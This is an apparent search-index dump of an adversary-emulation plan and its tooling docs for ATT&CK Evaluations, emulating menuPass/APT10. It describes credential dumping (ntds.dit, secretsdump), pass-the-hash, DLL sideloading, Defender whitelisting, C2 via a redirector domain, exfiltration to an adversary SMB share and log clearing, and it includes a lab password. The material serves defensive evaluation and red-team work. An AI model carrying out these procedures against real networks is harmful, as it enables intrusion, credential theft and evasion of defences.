Subsidiary A Domain Controller parrotmon (10.10.10.4), menuPass uses the QuasarRAT implant on the Subsidiary A Domain Controller parrotmon (10.10.10.4) to execute the native ntdsutil.exe utility to export the Active Directory database to ntds.dit. Then, menuPass uses QuasarRAT to exfiltrate the generated ntds.dit and SYSTEM hive files then dumps credentials offline to retrieve hashes of authenticated users. These hashes are cracked offline to retrieve plaintext passwords for the domain users.","menuPass then performs an internal port scan to search for open RDP and SMB ports on the network. A reverse nslookup is then performed against the active IP addresses to resolve the hostnames."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Using the QuasarRAT implant on the Subsidiary A Domain Controller parrotmon (10.10.10.4), execute whoami to get the user SID of kizumi.da","Using the QuasarRAT implant on the Subsidiary A Domain Controller parrotmon (10.10.10.4), create folder $RCXNYCG in kizumi.da's Recycle Bin ( C:\\$Recycle.Bin\\S-1-5-21-156812349-472333277-3174882868-1109\\$RCXNYCG).","Using the QuasarRAT implant on the Subsidiary A Domain Controller parrotmon (10.10.10.4), execute ntdsutil.exe to generate ntds.dit.","Using the QuasarRAT implant on the Subsidiary A Domain Controller parrotmon (10.10.10.4), exfiltrate the generated ntds.dit file.","Using the QuasarRAT implant on the Subsidiary A Domain Controller parrotmon (10.10.10.4), exfiltrate the generated SYSTEM file","Using impacket, locally dump credentials to retrieve hashes of authenticated users, validate the NTLM hash of kizumi.da is contained in the output:","Using the QuasarRAT implant on the Subsidiary A Domain Controller parrotmon (10.10.10.4), port scan the workstations of the Subsidiary A network.","Using the QuasarRAT implant on the Subsidiary A Domain Controller parrotmon (10.10.10.4), execute nslookup against the active hosts. Wait until each command has returned before executing the next.","phantomon","ghostmon","cecilmon"]},{"i":"reference-code-reporting","l":"\uD83D\uDD0D Reference Code & Reporting","p":["-","ATT&CK Technique","BlackBerry","Execute ntdsutil.exe","ExecuteProcess","Exfiltrate ntds.dit from Recycle Bin","Exfiltrate SYSTEM from Recycle Bin","http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf","https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf","https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf","â¹ï¸ NOTE: Not all techniques listed in this table directly map to evaluation substeps","JSAC-jpcert Kaspersky","Kaspersky","Nslookup hosts","Port scan Subsidiary A network","PortScanHandler.cs","pwc","QuasarRAT creates folder $RCXNYCG in kizumi.da's Recycle Bin","QuasarRAT execute commands","Red Team Activity","Relevant CTI Report","Source Code Link","T1003.003 OS Credential Dumping: NTDS","T1016 System Network Configuration Discovery","T1041 Exfiltration Over C2 Channel","T1046 Network Service Discovery","T1074.001 Data Staged: Local Data Staging","T1106 Native API"]},{"i":"step-6---preparation-for-lateral-movement-onto-subsidiary-b-network","l":"Step 6 - Preparation for Lateral Movement onto Subsidiary B Network"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["menuPass performs additional Active Directory enumeration, through which the following are identified:","A trusted domain DIGIREVENGE","A bastion workstation kimeramon (10.20.20.11) in DIGIREVENGE allowing authentication for Subsidiary A users","Hosts and users within DIGIREVENGE","Using the QuasarRAT implant on the Subsidiary A Domain Controller parrotmon (10.10.10.4), menuPass downloads SigLoader and its necessary components to the Subsidiary A Domain Controller, then moves them to the bastion workstation kimeramon (10.20.20.11).","Using the QuasarRAT implant on the Subsidiary A Domain Controller parrotmon (10.10.10.4), menuPass then remotely creates a service on the bastion workstation kimeramon (10.20.20.11) to execute a legitimate binary that will sideload SigLoader."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Using the QuasarRAT implant on the Subsidiary A Domain Controller parrotmon (10.10.10.4), execute dsquery to enumerate further information on the active hosts","Using the QuasarRAT implant on the Subsidiary A Domain Controller parrotmon (10.10.10.4), execute dsquery to enumerate further information on trusted domains","Ensure DIGIREVENGE is listed as a trusted domain","Using the QuasarRAT implant on the Subsidiary A Domain Controller parrotmon (10.10.10.4), execute dsquery to enumerate further information on the active hosts within DIGIREVENGE","Ensure kimeramon (10.20.20.11) is listed in the output","Using the QuasarRAT implant on the Subsidiary A Domain Controller parrotmon (10.10.10.4), execute dsquery to enumerate further information on the users within DIGIREVENGE","Using the QuasarRAT implant on the Subsidiary A Domain Controller parrotmon (10.10.10.4), download SigLoader and its necessary components(SodaMaster version) and move them to the bastion workstation kimeramon (10.20.20.11). Wait until each command has returned before executing the next.","SigLoader layer 1","SigLoader layer 2","SodaMaster","Using the QuasarRAT implant on the Subsidiary A Domain Controller parrotmon (10.10.10.4), remotely create a service on the bastion workstation kimeramon (10.20.20.11) to execute a legitimate binary that will sideload SigLoader"]},{"i":"reference-code-reporting","l":"\uD83D\uDD0D Reference Code & Reporting","p":["-","ATT&CK Technique","BlackBerry","Create service","Dropped files were modified to contain shellcode","Dropped files' signatures are still valid","Execute dsquery to enumerate active host information","Execute dsquery to enumerate trusted domains","Execute dsquery to enumerate user information","Execute File Download","ExecuteProcess","http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf","https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf","https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf","https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/","https://www.lac.co.jp/lacwatch/report/20201201_002363.html","https://www.macnica.co.jp/business/security/manufacturers/files/mpressioncss_ta_report_2020_5_en.pdf","https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html","â¹ï¸ NOTE: Not all techniques listed in this table directly map to evaluation substeps","Kaspersky","Mandiant","QuasarRAT downloads files","QuasarRAT execute commands","Red Team Activity","Relevant CTI Report","SigFlip documentation","Source Code Link","T1018 Remote System Discovery","T1027.009 Obfuscated Files or Information: Embedded Payloads","T1087.002 Account Discovery: Domain Account","T1105 Ingress Tool Transfer","T1106 Native API","T1482 Domain Trust Discovery","T1543.003 Create or Modify System Process: Windows Service","T1553.002 Subvert Trust Controls: Code Signing"]},{"i":"step-7---lateral-movement-onto-subsidiary-b-network","l":"Step 7 - Lateral Movement onto Subsidiary B Network"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Using the QuasarRAT implant on the Subsidiary A Domain Controller parrotmon (10.10.10.4), menuPass remotely executes the created service on the bastion workstation kimeramon (10.20.20.11) to execute a legitimate binary that will sideload SigLoader.","On execution, SigLoader will again perform its layered loading, with the final loaded payload this time being SodaMaster. Once SodaMaster is executed, it will perform the following initialization steps:","Perform automated host discovery","Execute anti-sandbox checks","Add itself to Windows Defender's whitelist","Check Defender configurations","Establish C2 communication using a redirector at notepad-plusplus[.]eu (121.93.44.121)","Eventually, a file server administrator kmimi from Subsidiary B's network RDPs in to the bastion workstation kimeramon (10.20.20.11) to perform tasks then disconnects from their session when complete."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Using the QuasarRAT implant on the Domain Controller, remotely execute the created service","This command should return FAILED 1053. This is expected because notepad++.exe is not configured as a service binary that would properly respond to the service manager. However, notepad++.exe will still execute and should remain running even after the command returns the failed message.","Confirm C2 registration of SodaMaster","â© Emulate the following legitimate user activity:","â¡ï¸ initiate an RDP session from the jumpbox homelander (176.59.17.22) to kimeramon (10.20.20.11) as the file server administrator:","Username","Password","DIGIREVENGE\\kmimi","cHjc3p3hJHJYPUzT@","Open Command Prompt, mount the file share:","Check the drive was mounted properly:","Disconnect from RDP and you should return to homelander (176.59.17.22)","â© Resume red team activity"]},{"i":"reference-code-reporting","l":"\uD83D\uDD0D Reference Code & Reporting","p":["-","ATT&CK Technique","CheckExpectedTime","CheckProcCount","CheckVMProcess","decrypt","defenderWhitelist","Execute Notepad++.exe to perform DLL sideloading","ExecutePowerShellCmd","GetCurrentComputerName","GetCurrentUserName","GetSMSysInfo","http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf","https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf","https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf","https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/","https://www.lac.co.jp/lacwatch/report/20201201_002363.html","https://www.macnica.co.jp/business/security/manufacturers/files/mpressioncss_ta_report_2020_5_en.pdf","https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html","â¹ï¸ NOTE: Not all techniques listed in this table directly map to evaluation substeps","JSAC-jpcert","Kaspersky","MSRCheck","Red Team Activity","RegistryCheck","Relevant CTI Report","run_code","SendData","SigLoader decrypts shellcode (combination of XOR/AES/DES)","SigLoader reflectively loads and executes SodaMaster","SodaMaster","SodaMaster adds itself to Defender's whitelist via Add-MpPreference","SodaMaster checks expected time between sleeps (anti-vm)","SodaMaster checks Model-Specific Register range used by hypervisors (anti-vm)","SodaMaster checks number of CPU cores is not 1 via GetSysInfo API (anti-vm)","SodaMaster checks registry via RegOpenKeyEx API (anti-vm)","SodaMaster checks running processes via CreateToolhelp32Snapshot API (anti-vm)","SodaMaster collects hostname via GetComputerNameA API","SodaMaster collects processor architecture and build information via GetSystemInfo and GetProductInfo APIs","SodaMaster collects username via GetUserName API","SodaMaster communicates over TCP","SodaMaster executes PowerShell via CreateProcess API","SodaMaster uses native APIs","SodaMaster uses stackstrings for obfuscation","Source Code Link","StackStrings documentation","T1027 Obfuscated Files or Information","T1033 System Owner/User Discovery","T1059.001 Command and Scripting Interpreter: PowerShell","T1082 System Information Discovery","T1095 Non-Application Layer Protocol","T1106 Native API","T1140 Deobfuscate/Decode Files or Information","T1497.001 System Checks","T1497.003 Time Based Evasion","T1562.001 Impair Defenses: Disable or Modify Tools","T1574.002 Hijack Execution Flow: DLL Side-Loading","T1620 Reflective Code Loading"]},{"i":"step-8---discovery-and-additional-privilege-escalation","l":"Step 8 - Discovery and Additional Privilege Escalation"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["menuPass uses SodaMaster to execute discovery actions, which will result in menuPass discovering a file server alphamon (10.20.10.23) and its administrator kmimi on Subsidiary Bâs network. SodaMaster creates threads for executing downloaded shellcode in memory.","To prepare to laterally move onto the file server, menuPass uses SodaMaster to download secretsdump.exe, which is Impacket's secretsdump.py converted to an executable binary using PyInstaller. SodaMaster executes secretsdump.exe to dump the SYSTEM/SECURITY/SAM hives on the bastion workstation kimeramon (10.20.20.11), authenticating using the NTLM hash for kizumi.da collected previously.","The retrieved dump contains a cached domain login for kmimi, the file server administrator in Subsidiary B which is cracked to reveal kmimi's plaintext password."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Using SodaMaster, execute the discovery actions shellcode. Wait until each command has returned before executing the next.","netstat -anop tcp","â Verify a network connection to alphamon (10.20.10.23) port 445","tasklist /v","â Verify that the enumerated processes output contains a process running under kmimi","net view 10.20.10.23 /all","â Verify the output contains a list of file shares with the file server host alphamon (10.20.10.23)","net user kmimi /domain","â Verify that File Server Admins is listed as one of the groups that kmimi is a member of","Using SodaMaster, download and execute secretsdump.exe, using the NTLM hash for kizumi.da collected in step 5","Using SodaMaster, curl the secretsdump output to exfiltrate the file","Confirm secretsdump output file was exfiltrated in the C2 server log then check for presence of a cached domain login for kmimi in the output:","â¹ï¸ This hash is cracked to retrieve the plaintext password for kmimi"]},{"i":"reference-code-reporting","l":"\uD83D\uDD0D Reference Code & Reporting","p":["-","ATT&CK Technique","ExecShellcode","http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf","https://cycraft.com/download/Smokescreen_Supply_Chain_Attack_Targets_Taiwan_Financial_Sector_A_Deeper_Look.pdf","https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf","https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/","https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-china-ngo-government-attacks","https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html","â¹ï¸ NOTE: Not all techniques listed in this table directly map to evaluation substeps","impacket","JSAC-jpcert","pwc","Red Team Activity","Relevant CTI Report","secretsdump.exe dumps cached domain login information","secretsdump.exe dumps local SAM hashes","secretsdump.exe dumps LSA secrets","SodaMaster downloads secretsdump.exe","SodaMaster execute commands via sRDI","SodaMaster executes curl to exfiltrate the dump output","SodaMaster executes net user kmimi /domain","SodaMaster executes net view 10.20.10.23 /all","SodaMaster executes netstat -anop tcp","SodaMaster executes secretsdump.exe with kizumi.da hash","SodaMaster executes tasklist /v","Source Code Link","T1003.002 OS Credential Dumping: Security Account Manager","T1003.004 OS Credential Dumping: LSA Secrets","T1003.005 OS Credential Dumping: Cached Domain Credentials","T1048.003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol","T1049 System Network Connections Discovery","T1057 Process Discovery","T1087.002 Account Discovery: Domain Account","T1105 Ingress Tool Transfer","T1135 Network Share Discovery","T1550.002 Use Alternate Authentication Material: Pass the Hash","T1620 Reflective Code Loading"]},{"i":"step-9---data-collection--exfiltration","l":"Step 9 - Data Collection & Exfiltration"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["menuPass uses SodaMaster to first download a modified WMIexec.vbs to C:\\Users\\kmimi\\appdata\\local\\temp\\w.vbs on the bastion workstation kimeramon (10.20.20.11). Then, menuPass executes w.vbs with the cracked plaintext password of the file server administrator kmimi to connect to the file server alphamon (10.20.10.23).","menuPass uses the reverse shell on the file server alphamon (10.20.10.23) to execute several PowerShell commands to enumerate and identify files of interest. menuPass then uses certutil to download WinRAR.exe to the file server alphamon (10.20.10.23) to C:\\Program Files\\conhost.exe. Then, menuPass executes WinRAR to compress files of interest. menuPass exfiltrates the compressed files using RoboCopy to an adversary controlled SMB share.","Once exfiltration of files is complete, menuPass clears the Windows event logs on the file server and command history."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â¡ï¸ Return to the RDP session on the Kali attack host kraken (176.59.1.18)","â¡ï¸ Return to the RDP with the reverse shell and, using the reverse shell to the file server, execute the wevtutil utility to clear Windows event logs","â¡ï¸ Switch to an open terminal in Kali and confirm the exfiltration was successful","cHjc3p3hJHJYPUzT@","Close the Command Prompt then disconnect from the RDP session","DIGIREVENGE\\kmimi","Exit the shell","Initiate an RDP session to the bastion workstation kimeramon (10.20.20.11) using the file server administrator kmimi credentials to authenticate.","Open a terminal window and start the SMB server:","Password","Username","Using SodaMaster, download WMIexec.vbs to the bastion workstation kimeramon (10.20.20.11)","Using the RDP session, open a Command Prompt then execute WMIexec.vbs with the file server administrator kmimi credentials targeting the file server alphamon (10.20.10.23)","Using the reverse shell to the file server, execute certutil.exe to download WinRAR.exe to the file server from the adversary server","Using the reverse shell to the file server, execute PowerShell file discovery commands","Using the reverse shell to the file server, execute WinRAR.exe to compress each file path containing files of interest","Using the reverse shell to the file server, mount an adversary controlled SMB share then execute the RoboCopy utility to exfiltrate the RAR to the adversary controlled SMB share"]},{"i":"reference-code-reporting","l":"\uD83D\uDD0D Reference Code & Reporting","p":["-","ATT&CK Technique","certutil.exe downloads WinRAR.exe","ExecShellcode","http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf","https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf","https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf","https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/","https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-china-ngo-government-attacks","https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html","â¹ï¸ NOTE: Not all techniques listed in this table directly map to evaluation substeps","JSAC-jpcert","List and clear all Windows event logs","pwc","Red Team Activity","Relevant CTI Report","Reverse shell executes PowerShell","Reverse shell uses PowerShell to enumerate file shares","Reverse shell uses PowerShell to enumerate files on discovered file shares","robocopy exfiltrates compressed files to adversary SMB share","SodaMaster downloads WMIexec.vbs","Source Code Link","Symantec","T1039 Data from Network Shared Drive","T1047 Windows Management Instrumentation","T1059.001 Command and Scripting Interpreter: PowerShell","T1059.003 Command and Scripting Interpreter: Windows Command Shell","T1070.001 Indicator Removal: Clear Windows Event Logs","T1105 Ingress Tool Transfer","T1135 Network Share Discovery","T1560.001 Archive Collected Data: Archive via Utility","WinRAR.exe compresses files of interest","wmiexec.vbs","WMIexec.vbs creates a remote WMI connection to the file server","WMIexec.vbs establishes reverse shell"]}],[{"l":"Resources","p":["The Resources directory contains the following:","Source code used for the components of the emulated attack","Documentation on building source code and details on usage","Backend components such as the control server","Terraform and Ansible code for the environment setup","Each component has one or more additional documents specific to that resource."]},{"l":"Resources Index","p":["cleanup","README","control_server","DebuggingGuide","fyanti","impacket","payloads","Quasar","Infrastructure Setup","SigLoader","SodaMaster"]}],[{"i":"attck-evaluations-control-server","l":"ATT&CK Evaluations Control Server","p":["This ATT&CK Evaluations Control Server is used to execute behaviors under test during ATT&CK Evaluations.","The Control Server provides features for generating implant stagers, controlling agents, and executing modules.","The Control Server is backed with a REST API to support automation and integration with other tools."]},{"l":"Usage","p":["This repository is meant to act as a submodule within other adversary emulation or ATT&CK evaluation repositories. To use this control server repository, you may either run the binary as is or reference the entire repository as a submodule.","The control server expects the following folder structure for payloads/uploads:","File uploads will be stored in the files subdirectory of the current working directory of the C2 server. The repository already has this directory available, but you will need to create the folder before running the binary from a different location.","Payload downloads will be fetched from the payloads folder of the parent directory of the C2 server's working location. The repository does not contain this payload directory, since the end user will be responsible for providing the payloads according to their specific use case. Ensure that this folder exists in the parent directory when running the C2 server. For example, if the control server is being run from the Resources/control_server directory, the payloads must be placed in Resources/payloads/ in order for the handlers to successfully serve them. Note that some handlers expect their payloads to be in a separate subdirectory under the payloads directory (e.g. Resources/payloads/handlername)","The control server is configured using two configuration YAML files - one for handler configuration and one for REST API configuration. By default, the control server will pull the REST API config from ./config/restAPI_config.yml. The handler configuration file is a required argument and must be provided using the -c or --config command-line flags. A sample handler configuration file is provided in ./config/sample_handler_config.yml as a reference only.","To change the REST API config path, use the -r or --rest-config command-line flags.","Example:"]},{"l":"Build from source","p":["To run with default REST API config path:","To specify REST API config path:"]},{"l":"Test Instructions","p":["Note: you may need to specify the full path to your golang binary if running under sudo.","For example:"]},{"l":"Usage Examples","p":["Enable C2 handlers and adjust configuration values to change IP address and ports to listen on by providing your own handler config YAML file. To enable a handler, set enabled to true, like below:","To disable a handler, set enabled to false, like below:","See ./config/sample_handler_config.yml for an example YAML file structure.","Start the control server:","To run with default REST API config path:","To specify REST API config path:","Alternatively run directly from source:","Note: you may need to specify the full path to your golang binary if running under sudo.","For example:"]},{"l":"Installation Dependencies","p":["Install Go version 1.15 or higher.","Run tests from the main repository directory. Go should automatically fetch needed dependencies.","Note: you may need to specify the full path to your golang binary if running under sudo.","For example:","Look at the go.mod file if you want to see the dependencies in detail."]},{"i":"attck-evaluations-c2-client","l":"ATT&CK Evaluations C2 Client","p":["This client is provided to interact with the C2 server via its REST API."]},{"l":"Build Instructions","p":["Install dependencies using pip3:"]},{"i":"test-instructions-1","l":"Test Instructions"},{"i":"usage-examples-1","l":"Usage Examples","p":["Enable C2 handlers and adjust configuration values to change IP address and ports to listen on by providing your own handler config YAML file. To enable a handler, set enabled to true, like below:","To disable a handler, set enabled to false, like below:","Start the control server:","To specify REST API config path:","Establish an implant session","Run an implant program of your choice to connect to the C2 (make sure that the corresponding handler was enabled).","Run the client python script to manage implant sessions.","For specific instructions on tasking a particular implant, reference the appropriate README."]}],[{"l":"SodaMaster TCP Handler","p":["The SodaMaster TCP Handler functions as the server-side counterpart to the SodaMaster implant, and communicates with it over TCP. The handler is configured to do the following:","respond to implant beacons or task requests with the implant's session ID or tasks","register a new implant with the control server, or indicate that a session already exists for the implant","process the data returned after the implant completes tasks","accept tasking from evalsC2client.py and send the tasks to the implant when requested","SodaMaster C2 Diagram drawio"]},{"l":"Components","p":["The handler consists of a TCP listener that listens on a specified address/port.","The first and second packets sent by the implant will contain the following discovery information:","The username/owner of the SodaMaster process","The hostname/computername of the system with the implant installed","The process ID of the SodaMaster process and the process privilege flag","Processor architecture and Windows build information","The date/time that the implant was initially executed","An RC4 key that will be used to encrypt the followup communications","The name of the socket used to connect to the C2 server","After the implant has been registered with the C2 server, it will automatically set a task to receive the remainder of the discovery information from the implant. The UUID/Session ID for the implant will be generated by the C2 handler by taking the MD5 hash of the user and computer name. The C2 server will respond to the implant's initial packet with the generated UUID, which will be prepended onto implant packets for all subsequent communications.","The C2 handler will receive and respond to implant packets in the following format:","The implant's first packet will contain a unique identifier, any following packets after the implant's session has been registered will contain it's session ID. Example packets are listed below:"]},{"l":"Encryption","p":["The first packet the implant sends is RSA encrypted. The packet will contain an RC4 key generated by the implant that will be used for subsequent encrypted communications between the implant and the server. All data in the packets will be encrypted. An example of the encrypted communications is below:","Since all of the data sent by the implant will be encrypted, the C2 Handler will loop through all stored keys until it finds one that is successful. If none of the stored keys were able to decrypt the data, the implant packet will be dropped.","The RSA key pair used by the C2 server and implant were generated with the following commands:"]},{"l":"Usage"},{"l":"Building","p":["To build the control server binary, run the following command from the evalsC2server directory:"]},{"l":"Configuration","p":["To enable and configure the SodaMaster TCP handler within the control server, provide a sodamaster entry in your handler configuration YAML file (see example below). Adjust the host and port values as necessary. To run the handler without encryption or for unit testing purposes, switch the encryption configuration to false.","Example:","Run the controlServer binary as sudo and monitor the output to see SodaMaster handler updates. Ex:"]},{"l":"Testing","p":["Unit tests for the SodaMaster TCP handler are available in the sodamaster_test.go file. To run these tests, run the following command from the evalsC2server directory:","To run only a single test, navigate to the evalsC2server\\handlers\\sodamaster directory and run:"]},{"l":"Tasking","p":["\"l\": Will tell the implant to set its sleep to 15 seconds","\"s\": Will recompile the execution template with 'payload.exe' and args 'whoami' and send the shellcode bytes to the implant to execute","\"w\": Will tell the implant to pop a message box with text 'Hello World!'","0","Any information the implants needs to complete the task. Ie. for task l(sleep), the command would be the number of seconds to sleep","args","Arguments","Beacon timer","cmd","Command","Command line arguments for the implant to execute. Should only be supplied with task s(execute).","Compiles an execution template that will write a desired payload to disk and/or execute any provided CLI arguments. Payload path is an optional parameter (default is C:/Windows/Temp). Either the payload name AND/OR the CLI arguments have to be supplied. More details on the execution template used for the \"s\" command can be found here.","Data Type","Description","Example commands:","Exit's the implant process","Field","id","Implant Output","l","Length","Message box title, Message box text","Necessity","None","NULL","optional","payload","Payload name, Payload path (optional), CLI arguments","payloadPath","Pops up a message box on the implant host","Process output if CLI args are supplied","required","s","Set the sleep time inbetween implant check-in's","string","The following table contains the various acceptable commands and their meanings:","The ID of the task the implant will execute. A table detailing the different tasks is available below.","The name of the server-side payload to deliver as part of the task.","The path to write the payload to on disk.","To submit a task to the C2 server, pass the task information to the REST API server in a JSON dictionary string containing the following fields:","Use the following format to submit the commands from the evalsC2server directory:","Variable","w","x"]},{"l":"Troubleshooting","p":["See here for a guide on how to set up the Golang debugger on VS Code."]},{"l":"General","p":["Ensure the IP address and port in the handler configuration matches those the implant is compiled with.","The handler is configured to discard any invalid/malicious data to avoid crashing, in the case of bad data the handler will throw an error message. Locate the error message in the source code and set a breakpoint in that function to debug the error.","If the implant data is not formatted correctly ( length of length or length incorrect, etc.), it will most likely error out here. If the handler throws an error in this function, follow the steps below to validate the data and ensure the implant is functioning correctly.","There are several layers of b64 encoding and encryption on comms sent between the handler and implant that can potentially cause the data to be malformed- here are some tips to start debugging if the data appears invalid:","Set a breakpoint in startListener( suggested line)","Compare the response and encryptedResponse variables with the plain text data and encrypted data received by the implant, ensure this data matches","Set a breakpoint in parseImplantData( suggested line)","Compare the data and encryptedData variables with the plain text data and encrypted data sent by the implant, ensure this data matches","If the data sent/received by the handler does not match with the implant:","Ensure that the task string is being formatted correctly here","Ensure that the data is being encrypted/decrypted correctly here"]},{"l":"Shellcode execution fails","p":["Set a breakpoint in the formatShellcodeTask utility function ( suggested line)","Check the shellcode variable for valid bytes, it is possible there was an error with generating the shellcode and the bytes are zeroed out","Check the beginning of the task string to make sure the id, len of length, and length variables all match what is received implant side"]},{"l":"CTI References","p":["https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/","http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf"]}],[{"i":"c-shellcode-execution-template","l":"C++ Shellcode Execution Template","p":["The C++ Shellcode Execution Template is used by the C2 server to recompile a payload that will be executed by the SodaMaster implant for each command execution task. The compiled binary will be converted to shellcode and executed by the SodaMaster implant, which will then pass the output of the execution back to the C2 server.","The template will find, load, and lock the resource located in the bin folder (should be replaced with the payload you want to write to disk) and then write it to disk at the desired path ( PAYLOAD_PATH) if the payload name is supplied. It will then create a cmd.exe process with the desired args ( ARGS) and a named pipe to write the output of the process to if CLI arguments are supplied."]},{"l":"Build Instructions","p":["When using the C++ template in conjunction with the SodaMaster implant and C2 server, the SodaMaster TCP handler will pass in the required parameters and recompile the template with the desired payload once the execution task has been assigned to the implant. There is no need to manually build the template in this case. For instructions on how to task the SodaMaster implant, see here.","The template is configured to cross compile Windows on a Linux machine. Instructions for manually building the template are below.","From Powershell/Terminal:","Install the necessary dependencies on your machine.","Replace the bytes of the payload.exe executable in the template\\bin folder with your desired payload bytes. Keep the name of the resource as payload.exe.","Navigate to the .../sodamaster/template directory in a terminal and run the following commands:"]},{"l":"Dependencies","p":["Linux:","CMake","MinGW"]},{"l":"Execution","p":["Linux:","Since the binary is compiled for Windows, it will not run on a Linux machine without a compatibility layer. See here for more information.","Windows:","Open Powershell and navigate to the ...\\sodamaster\\template\\bin directory. Either run the test_template.exe executable or the template.dll DLL with rundll32.exe and exported function \"Run\" to execute the template binary."]},{"l":"Testing","p":["Compile the exe/dll with the build commands above. After the build is complete, run the test.exe executable concurrently with test_template.exe or template.dll. Monitor your terminal to see the test output.","The ...\\template\\testing code is pulled from the SodaMaster implant, and can be found here."]},{"l":"Cleanup","p":["Delete the payload from disk on the victim machine (should be located at PAYLOAD_PATH with PAYLOAD_NAME)."]},{"l":"Resources","p":["https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/","http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf","https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf","https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html"]}],[{"l":"Creating Your Own Handler","p":["The Evals C2 server is designed with customization in mind. Developers can easily add new handlers to the C2 server, and users can easily toggle which handlers to enable/disable and configure their settings. This guide describes how developers can add a new handler to the C2 server.","In this guide, we'll use an HTTP C2 handler as a basic example, and we'll call it examplehttphandler."]},{"l":"Add Your Handler Source Code","p":["Within the handlers folder, create a new folder for your C2 handler. In our case, we'll call it examplehttphandler. This folder will contain a Golang package for your C2 handler - all your handler source code and associated test files will go here.","We'll pretend that we created the following files for our demo C2 handler:","handlers/examplehttphandler/examplehttphandler.go","handlers/examplehttphandler/examplehttphandler_test.go"]},{"l":"Handler Init Function","p":["In one of your handler source code files, you will need to mark your C2 handler as an available handler in an init function. This way, when your handler package gets imported, the C2 server will know that your handler is available and where to reach it. You will also need to use a struct to represent your handler, as your handler will need to implement the util.Handler interface. The below code provides an example:","Note that we use a factory method to return our struct - this gives us more flexibility if we need to add more variables to our handler struct, and it allows easier handler creation in unit tests.","util.AvailableHandlers maps handler names ( string) to handler structs that implement the util.Handler interface. This means that our new handler must implement the util.Handler interface:","Since each handler may operate differently, we leave it up to the handler creaters to determine how to start and stop their handlers. The only requirements are the method signatures - both methods must return error if something goes wrong, and StartHandler must take in a string(the REST API server address) and a config.HandlerConfigEntry, which represents the handler config entry for our specific handler. You will not need to call these methods outside of your unit tests - main.go will handle that for you when starting up enabled C2 handlers.","For our HTTP handler, we can use StartHandler to listen on the address specified in our configuration entry (which we will create momentarily) and to serve URL paths of our choice. Feel free to reference other handler implementations to get an idea of how you can set up your C2 handler. StopHandler will take care of gracefully tearing down the handler components."]},{"l":"Register Our C2 Handler","p":["There are two steps for registering our C2 handler - creating a configuration entry and making sure our handler package gets imported."]},{"l":"Import Handler","p":["In order for the C2 server executable to incorporate our new handler code, we need to import the package so that the init function in our handler source code runs. We can do this by adding a new import statement in handler/handlers.go(change your package name accordingly):","The _ underscore in front of the import means that we're only importing the package for its side effects, in particular the init function. Remember that the init function is what stores our handler struct in the map of available handlers. handlers.go will not directly reference individual C2 handlers, so we can't use a typical import."]},{"l":"Config Entry","p":["The handler configuration YAML file contains the configuration entries for all of the available handlers in the C2 server. Each entry is a dictionary that maps the handler name to an inner dictionary that maps a configuration setting name to its value.","For example:","In the above example, the handler name is myhandler, and there are three configuration settings:","host- the IP address that the handler should bind to when listening for C2 traffic","port- the port that the handler should listen on","enabled: whether or not the handler should run when the C2 server starts up.","Since different handlers can use different protocols and methods for handling C2 traffic, you may see that some handlers have different settings in their config entries. The only one that is required is the enabled setting, since this tells the C2 server whether or not to run the handler.","When creating your own handler, think about what configuration settings it will need. If the C2 traffic will be over 